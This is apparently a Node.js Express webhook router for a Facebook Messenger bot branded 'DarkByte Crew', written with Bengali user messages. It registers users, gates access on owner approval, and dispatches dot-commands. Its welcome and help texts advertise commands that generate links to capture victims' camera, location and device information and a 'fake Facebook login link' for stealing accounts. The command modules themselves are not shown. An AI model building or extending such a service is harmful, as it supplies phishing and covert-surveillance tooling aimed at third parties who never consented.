const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const router = express.Router();
const { getConfig, sendMessage, getUserProfile } = require('../utils/helpers');
const User = require('../models/User');

async function runCommand(senderId, command, args) {
    const cmdPath = path.join(__dirname, '../commands', `${command}.js`);
    if (fs.existsSync(cmdPath)) {
        try {
            const cmd = require(cmdPath);
            if (typeof cmd.execute === 'function') {
                await cmd.execute(senderId, args, sendMessage);
            } else {
                await sendMessage(senderId, '⚠️ কমান্ড ফাইল ঠিকমতো লোড হয়নি।');
            }
        } catch (err) {
            console.error('Command error:', err);
            await sendMessage(senderId, '❌ কমান্ড চালাতে সমস্যা হয়েছে।');
        }
    } else {
        // ভুল কমান্ড (অজানা কমান্ড)
        await sendMessage(senderId, `⚠️ আপনি ভুল কমান্ড দিয়েছেন! সঠিক কমান্ড দিন:

🔹 .camera ➔ ক্যামেরা + ডিভাইস ইনফো লিংক
🔹 .location ➔ লোকেশন + ডিভাইস ইনফো লিংক
🔹 .fb ➔ ফেক ফেসবুক লগইন লিংক

🔗 Owner: m.me/2ndJohnnySins`);
    }
}

router.get('/webhook', (req, res) => {
    const mode = req.query['hub.mode'];
    const token = req.query['hub.verify_token'];
    const challenge = req.query['hub.challenge'];
    getConfig().then(config => {
        if (mode === 'subscribe' && token === config.verifyToken) {
            res.status(200).send(challenge);
        } else {
            res.sendStatus(403);
        }
    }).catch(() => res.sendStatus(403));
});

router.post('/webhook', async (req, res) => {
    const body = req.body;
    if (body.object !== 'page') return res.sendStatus(404);

    try {
        for (const entry of body.entry) {
            const event = entry.messaging[0];
            if (!event || !event.message || !event.message.text) continue;

            const senderId = event.sender.id;
            const text = event.message.text.trim();

            console.log(`📩 মেসেজ পেয়েছি: ${senderId} -> "${text}"`);

            let user = await User.findOne({ fbId: senderId });

            if (!user) {
                // ইউজারের প্রোফাইল থেকে ফুল নাম সংগ্রহ করি
                const profile = await getUserProfile(senderId);
                const fullName = profile?.name || (profile?.first_name && profile?.last_name ? `${profile.first_name} ${profile.last_name}` : 'বন্ধু');

                user = new User({
                    fbId: senderId,
                    firstName: fullName,   // পুরো নাম সংরক্ষণ
                    allowed: false,
                    firstSeen: new Date()
                });
                await user.save();

                // নতুন ইউজারের জন্য ওয়েলকাম মেসেজ (আপনার দেওয়া ফরম্যাট)
                const introMsg = `আসসালামু আলাইকুম, ${fullName}! 👋

DarkByte Crew বটে আপনাকে স্বাগতম! 🥳

এই বটের মাধ্যমে আপনি খুব সহজেই ডিভাইসের ইনফরমেশন, ক্যামেরা, লোকেশন এবং ফেসবুক অ্যাকাউন্ট অ্যাক্সেস করার লিংক তৈরি করতে পারবেন। 💯

⚙️ আমাদের কমান্ডসমূহ:
━━━━━━━━━━━━━━━━━━━━
📷 .camera — ক্যামেরা লিংক তৈরি করুন
📍 .location — লোকেশন লিংক তৈরি করুন
👤 .fb — ফেসবুক আইডি লিংক তৈরি করুন

🔗 Owner: m.me/2ndJohnnySins`;

                await sendMessage(senderId, introMsg);
                continue;
            }

            // লাস্ট সিন আপডেট
            user.lastSeen = new Date();
            user.messageCount = (user.messageCount || 0) + 1;
            await user.save();

            // অনুমতি চেক
            if (!user.allowed) {
                // অনুমতি না থাকলে মেসেজ
                const accessDeniedMsg = `⛔ Access Denied / অনুমতি নেই!

এই বটটি ব্যবহার করতে চাইলে ওনারের সাথে যোগাযোগ করে অনুমতি নিন।

🔗 Owner: m.me/2ndJohnnySins`;
                await sendMessage(senderId, accessDeniedMsg);
                continue;
            }

            // কমান্ড প্রসেস
            if (text.startsWith('.')) {
                const parts = text.slice(1).split(' ');
                const command = parts[0].toLowerCase();
                const args = parts.slice(1);
                await runCommand(senderId, command, args);
            } else {
                // অনুমতি থাকলেও কমান্ড না দিলে নির্দেশনা (ভুল কমান্ডের মতো)
                await sendMessage(senderId, `⚠️ আপনি ভুল কমান্ড দিয়েছেন! সঠিক কমান্ড দিন:

🔹 .camera ➔ ক্যামেরা + ডিভাইস ইনফো লিংক
🔹 .location ➔ লোকেশন + ডিভাইস ইনফো লিংক
🔹 .fb ➔ ফেক ফেসবুক লগইন লিংক

🔗 Owner: m.me/2ndJohnnySins`);
            }
        }
        res.status(200).send('EVENT_RECEIVED');
    } catch (err) {
        console.error('❌ Webhook error:', err);
        res.status(500).send('Error');
    }
});

module.exports = router;